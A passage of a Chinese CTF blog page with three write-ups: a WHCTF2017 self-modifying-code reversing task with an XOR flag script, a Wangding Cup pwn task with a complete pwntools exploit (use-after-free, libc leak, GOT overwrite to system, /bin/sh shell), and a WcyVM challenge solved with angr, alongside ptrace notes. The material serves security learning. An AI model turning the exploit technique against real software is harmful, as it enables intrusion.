class="keyword">movsxd</span> <span class="built_in">rdx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x600b86</span>  <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x600b8a</span>  <span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x600b8d</span>  <span class="keyword">movzx</span>  <span class="built_in">edx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x600b90</span>  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x600b93</span>  <span class="keyword">cdqe</span>   </span><br><span class="line"><span class="number">0x600b95</span>  <span class="keyword">movzx</span>  <span class="built_in">eax</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>+<span class="built_in">rax</span>*<span class="number">1</span>-<span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x600b9a</span>  <span class="keyword">cmp</span>    <span class="built_in">dl</span>,<span class="built_in">al</span></span><br><span class="line"><span class="number">0x600b9c</span>  <span class="keyword">je</span>     <span class="number">0x600ba5</span> &lt;judge+<span class="number">165</span>&gt;</span><br><span class="line"><span class="number">0x600b9e</span>  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x600ba3</span>  <span class="keyword">jmp</span>    <span class="number">0x600bb4</span> &lt;judge+<span class="number">180</span>&gt;</span><br><span class="line"><span class="number">0x600ba5</span>  <span class="keyword">add</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>],<span class="number">0x1</span></span><br><span class="line"><span class="number">0x600ba9</span>  <span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x4</span>],<span class="number">0xd</span></span><br><span class="line"><span class="number">0x600bad</span>  <span class="keyword">jle</span>    <span class="number">0x600b80</span> &lt;judge+<span class="number">128</span>&gt;</span><br><span class="line"><span class="number">0x600baf</span>  <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line"><span class="number">0x600bb4</span>  <span class="keyword">pop</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x600bb5</span>  <span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
-
-<p>可见上述汇编代码，首先进行了一次初始化操作。大概操作就是将初始化的值和下标i异或，随后再将输入的字符串做同样的操作，并进行cmp，跑个脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x7f</span>,<span class="number">0x6b</span>,<span class="number">0x37</span>,<span class="number">0x64</span>,<span class="number">0x3b</span>,<span class="number">0x56</span>,<span class="number">0x60</span>,<span class="number">0x3b</span>,<span class="number">0x6e</span>,<span class="number">0x70</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    flag+= chr(s[i] ^ i)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
-
-<p>得到flag：flag{n1c3_j0b}（不会读汇编真的难受</p>
-<h2 id="6个月后…"><a href="#6个月后…" class="headerlink" title="6个月后…."></a>6个月后….</h2><ul>
-<li>IDA打开找main直接F5</li>
-<li>发现了熟悉的东西….</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">181</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    envp = (<span class="keyword">const</span> <span class="keyword">char</span> **)(*((<span class="keyword">unsigned</span> __int8 *)judge + i) ^ <span class="number">0xC</span>u);</span><br><span class="line">    *((_BYTE *)judge + i) ^= <span class="number">0xC</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input flag:"</span>, argv, envp);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%20s"</span>, &amp;s);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">14</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)judge((__int64)&amp;s) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>这不就是SMC吗…..当时太菜了,直接上IDC</li>
-</ul>
-<blockquote>
-<p>auto i;for(i=0x600B00;i&lt;600B00+182;i++){PatchByte(i,Byte(i)^0xc);} </p>
-</blockquote>
-<p>解出函数内部如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">judge</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+9h] [rbp-1Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ah] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+Bh] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+Ch] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+Dh] [rbp-1Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+Eh] [rbp-1Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+Fh] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+11h] [rbp-17h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+12h] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+13h] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+14h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+15h] [rbp-13h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">102</span>;</span><br><span class="line">  v3 = <span class="number">109</span>;</span><br><span class="line">  v4 = <span class="number">99</span>;</span><br><span class="line">  v5 = <span class="number">100</span>;</span><br><span class="line">  v6 = <span class="number">127</span>;</span><br><span class="line">  v7 = <span class="number">107</span>;</span><br><span class="line">  v8 = <span class="number">55</span>;</span><br><span class="line">  v9 = <span class="number">100</span>;</span><br><span class="line">  v10 = <span class="number">59</span>;</span><br><span class="line">  v11 = <span class="number">86</span>;</span><br><span class="line">  v12 = <span class="number">96</span>;</span><br><span class="line">  v13 = <span class="number">59</span>;</span><br><span class="line">  v14 = <span class="number">110</span>;</span><br><span class="line">  v15 = <span class="number">112</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + a1) ^= i;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) != *(&amp;v2 + i) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>就这么直接异或出flag了..当时怎么这么菜..</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/29/WHCTF2017 逆向签到题/" data-id="cjyn83qe8000licthplsfpz28" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-wdctfpwn0" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/29/wdctfpwn0/" class="article-date">
-  <time datetime="2019-07-28T17:11:01.823Z" itemprop="datePublished">2019-07-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/PWN/">PWN</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/29/wdctfpwn0/">网鼎杯半决赛pwn1</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="一个短信系统"><a href="#一个短信系统" class="headerlink" title="一个短信系统"></a>一个短信系统</h1><ul>
-<li>定义了两个结构体,分别如下,一个是用户信息的结构体,一个是信息结构体</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00000000</span><br><span class="line">00000000 message         struc ; (sizeof=0x18, align=0x8, mappedto_6)</span><br><span class="line">00000000 title           dq ?                    ; offset</span><br><span class="line">00000008 content         dq ?</span><br><span class="line">00000010 next            dq ?</span><br><span class="line">00000018 message         ends</span><br><span class="line">00000018</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 pwn             struc ; (sizeof=0x128, align=0x8, mappedto_7)</span><br><span class="line">00000000 malloc_name_ptr dq ?</span><br><span class="line">00000008 age             dq ?</span><br><span class="line">00000010 description     db 256 dup(?)</span><br><span class="line">00000110 messagenode     dq ?                    ; offset</span><br><span class="line">00000118 friend_ptr      dq ?</span><br><span class="line">00000120 inuse           dq ?</span><br><span class="line">00000128 pwn             ends</span><br><span class="line">00000128</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>程序逻辑有一些复杂,但是有几个关键的地方值得注意一下</p>
-</li>
-<li><p>人物信息结构体中有许多指针,而且排布相对稳定</p>
-</li>
-<li><p>程序只有两处地方调用了free函数,并且未置空指针,这就导致了UAF的存在</p>
-</li>
-<li><p>还有strdup函数,第一次见,作用不是很清楚,去查了一下才知道它的作用和malloc后scanf是一样的</p>
-</li>
-<li><p>程序中有大量的链表指针操作,显得非常复杂,但是不用太过于纠结,在我尝试了一下执行free后,人物信息结构体被free掉了,这就导致了有0x130的空间可以被利用</p>
-</li>
-<li><p>期间我尝试了利用strdup来进行堆块错位的操作,但是并没有成功,因为p64()函数自动补的0影响了strdup的过程,而唯一比较容易的可控的地方是nameptr,只要覆盖了name指针内容,show后再进行updata,就可以leak程序基址修改程序的got表</p>
-</li>
-<li><p>这里我free了两块大堆块,导致了我有0x260的空间可以使用,然后我就可以利用刚才的strdup,来进行指针的覆盖</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line">atoi_libc = <span class="number">0x36E80</span> <span class="comment">#offset</span></span><br><span class="line">sys_libc = <span class="number">0x45390</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(namesize,name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Input your name size:"</span>,str(namesize))</span><br><span class="line">    r.sendafter(<span class="string">"Input your name:"</span>,name)</span><br><span class="line">    r.sendlineafter(<span class="string">"Input your age:"</span>,<span class="string">"18"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Input your description:"</span>,<span class="string">"1"</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">    r.sendafter(<span class="string">"Please input your user name:"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(name,age)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    r.sendafter(<span class="string">"Input your name:"</span>,name)</span><br><span class="line">    r.sendlineafter(<span class="string">"Input your age:"</span>,<span class="string">"18"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Input your description:"</span>,<span class="string">"1"</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddDeleFriend</span><span class="params">(module,name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    r.sendafter(<span class="string">"Input the friend's name:"</span>,name)</span><br><span class="line">    r.sendlineafter(<span class="string">"So..Do u want to add or delete this friend?(a/d)"</span>,module)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">(name,content,title)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"4"</span>)</span><br><span class="line">    r.sendafter(<span class="string">"Which user do you want to send a msg to:"</span>,name)</span><br><span class="line">    r.sendlineafter(<span class="string">"Input your message title:"</span>,title)</span><br><span class="line">    r.sendlineafter(<span class="string">"Input your content:"</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    register(<span class="number">0x80</span>,<span class="string">"111111"</span>)</span><br><span class="line">    register(<span class="number">0x80</span>,<span class="string">"222222"</span>)</span><br><span class="line"></span><br><span class="line">    login(<span class="string">"111111"</span>)</span><br><span class="line">    AddDeleFriend(<span class="string">"a"</span>,<span class="string">"111111"</span>)</span><br><span class="line">    AddDeleFriend(<span class="string">"d"</span>,<span class="string">"111111"</span>)</span><br><span class="line">    logout()</span><br><span class="line">    login(<span class="string">"222222"</span>)</span><br><span class="line">    AddDeleFriend(<span class="string">"a"</span>,<span class="string">"222222"</span>)</span><br><span class="line">    AddDeleFriend(<span class="string">"d"</span>,<span class="string">"222222"</span>)</span><br><span class="line">    payload = <span class="string">'\x30'</span>*<span class="number">16</span>*<span class="number">15</span></span><br><span class="line">    payload += p64(<span class="number">0x602060</span>)</span><br><span class="line">    message(<span class="string">"222222"</span>,payload,<span class="string">"title"</span>)</span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">"Username:"</span>)</span><br><span class="line">    atoi = u64(r.recv(<span class="number">6</span>) +<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"atoi :%x"</span>%atoi</span><br><span class="line">    system=atoi-atoi_libc + sys_libc</span><br><span class="line">    edit(p64(system),<span class="number">18</span>)</span><br><span class="line">    r.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/29/wdctfpwn0/" data-id="cjyn83qey0023icthq6zxeg6c" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-wcyvm" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/29/wcyvm/" class="article-date">
-  <time datetime="2019-07-28T17:11:01.818Z" itemprop="datePublished">2019-07-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/RE/">RE</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/29/wcyvm/">WcyVM</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="加急出的一个垃圾vm"><a href="#加急出的一个垃圾vm" class="headerlink" title="加急出的一个垃圾vm"></a>加急出的一个垃圾vm</h1><ul>
-<li>给校赛出的题目,虽然很早写出来解释器部分,但是因为加密部分没有想好,所以一直没有什么进展,比赛结束前10个小时,因为逆向题目不太够,就草草写了个算法(单表替换),放了出来,结果半个小时就被秒了,很明显不是预期解,比赛结束后也听到了而且想到了各种解法,虽然归根结底是算法的问题,不过姑且把这个题当做一个例题来整理复习一下逆向的基本姿势和神奇操作</li>
-<li>首先明确一个方向,因为是单表替换,所以加密后的flag只有有限次数的组合,所以可以利用各种爆破姿势来进行解题</li>
-</ul>
-<p>//vm这个东西都要被出题人玩烂了,打log什么的基本做法就不写了</p>
-<h1 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h1><ul>
-<li>首先要确定是个单表加密,那么这里可以采用黑盒测试,方式还算简单,比如输入一大串符合长度的A,可以在内存中看到加密后的每一位还是一样的,也就是说还是一段连续相同的数据</li>
-<li>听说校内某队伍发现这点以后直接手动打的替换表,然后将对应关系抄到纸上找的flag2333333,不过后来想了一下虽然做法不怎么优雅但是做出来的速度应该挺快的.</li>
-<li>下面介绍三种比较优雅的做题方式,hook内存,angr符号执行,pin侧信道攻击</li>
-</ul>
-<h1 id="符号执行-如何一分钟秒掉这个vm"><a href="#符号执行-如何一分钟秒掉这个vm" class="headerlink" title="符号执行(如何一分钟秒掉这个vm)"></a>符号执行(如何一分钟秒掉这个vm)</h1><ul>
-<li>这是已知最快的解法了,先来说下符号执行,很明显,路径很短而且相对固定,算法模式很简单,没有字符之间的操作,按照符号执行的思想到最后应该只有一组70元1次方程组,内部的约束求解器计算的应该是非常快的,可以说是秒解</li>
-<li>甚至可以直接套最简单的那种angr的模板来做</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line">p = Project(<span class="string">"./WcyVM"</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">s = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(s)</span><br><span class="line">r = sm.explore(find = <span class="number">0x401366</span>,avoid = <span class="number">0x401372</span>)</span><br><span class="line"><span class="keyword">print</span> r.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>没错,就是这么简洁,直接弹flag了(-1s)</li>
-</ul>
-<h1 id="pin侧信道"><a href="#pin侧信道" class="headerlink" title="pin侧信道"></a>pin侧信道</h1><ul>
-<li>这个相对angr来说就相对复杂了一些,这里攻击的地方主要是程序结尾的check函数部分,因为在验证失败的时候程序是直接ret 0的,而验证成功的时候则会继续后向遍历,可以想象下两次运行的过程中对于flag的验证运行的指令数是不一样的,而且运算过程没有flag位于位之间的操作,那么利用pintool就可以块的解出这道题目,而且即使这个题目不是单表加密,掺杂了和index和位之间操作,手动找替换就变得复杂了(当然最稳的还是传统的打log),有的时候angr也会因为方程太多速度变得很慢.</li>
-<li>但是在验证的过程中,没有达到预期的效果,无论输入的flag长度有多长或者改错几位,只要不是全部正确,指令数就是一个相对固定的数字,不知道出现了什么玄学问题(=w=)</li>
-</ul>
-<h1 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h1><ul>
-<li>当时在suctf的时候的Enigma,看到了奈沙师傅利用frida爆破flag的操作,相比之下,我就是复现程序之后利用手动写脚本爆出来的….相比之下第一种方式的速度肯定是更快,话说前几天的湖湘杯的逆向也是,我的思路还是复现hash函数的算法然后手动爆,但是师傅却将exe作为了dll加载然后利用RVA调用的hash函数进行爆破Orz.</li>
-<li>这里就不利用现成的框架来hook了,尝试一下自己写一个hook程序,我们要做的就是监视部分地址的内存,linux中的ptrace系统调用很好的支持了这一个功能,frida框架的原理其实也是利用ptrace对程序进行hook</li>
-<li>ptrace系统调用可以使一个进程控制另一个进程,对另一个进程进行内存读写,寄存器查看,或者断点调试等操作</li>
-<li>这里整理几个常见的request参数和相对应的功能</li>
-</ul>
-<h3 id="PTRACE-TRACEME"><a href="#PTRACE-TRACEME" class="headerlink" title="PTRACE_TRACEME"></a>PTRACE_TRACEME</h3><ul>
-<li>该函数是由子线程进行调用的,可以使该子进程被父进程跟踪,进而父进程可以对此进程进行内存读写,寄存器的控制,参数一般都为0,ptrace(PTRACE_TRACEME,0,NULL,NULL).在执行之后,父进程传递给该函数的所有信号,都会使子线程停止(SIGKILL除外).一般的调试器开始调试一个程序的时候,实际上是分了两步来操作,一步是利用fork()函数生成一个子进程,在子进程中,先执行一个TRACEME然后再利用exec相关函数运行待调试程序,不过这个时候父进程就可以对fork分支出的子进程进行调试操作了.(fork函数会有两个返回值,分支出的两个线程的pid是不一样的,返回值为0的是子进程,返回值非零的是父进程,但是在父进程中可以发现pid其实是子进程的pid)</li>
-</ul>
-<h3 id="PTRACE-ATTACH"><a href="#PTRACE-ATTACH" class="headerlink" title="PTRACE_ATTACH"></a>PTRACE_ATTACH</h3><ul>
-<li>该函数一般在父进程执行调用,一般的调用方式是ptrace(PTRACE_ATTACH,pid,NULL,NULL),在父进程中执行后,pid对应进程的程序的父进程就会变成执行ATTACH的程序,其实和在子进程中执行TRACEME是等价的,这也就是调试器attach到一个进程的原理</li>
-</ul>
-<h3 id="PTRACE-KILL"><a href="#PTRACE-KILL" class="headerlink" title="PTRACE_KILL"></a>PTRACE_KILL</h3><ul>
-<li>主线程调用,执行后可以kill掉子进程.在进行attach的过程中,有的时候并不能成功kill掉子进程,这个时候就要用自带的errno来查看报错id</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/29/wcyvm/" data-id="cjyn83qex001zicthnxu6s9vn" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
-  </nav>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CVE/">CVE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/FE/">FE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/RE/">RE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/balabala/">balabala</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/算法/">算法</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/9102/07/">July 9102</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/9102/07/29/杂谈/">写在前面</a>
-          </li>
-        
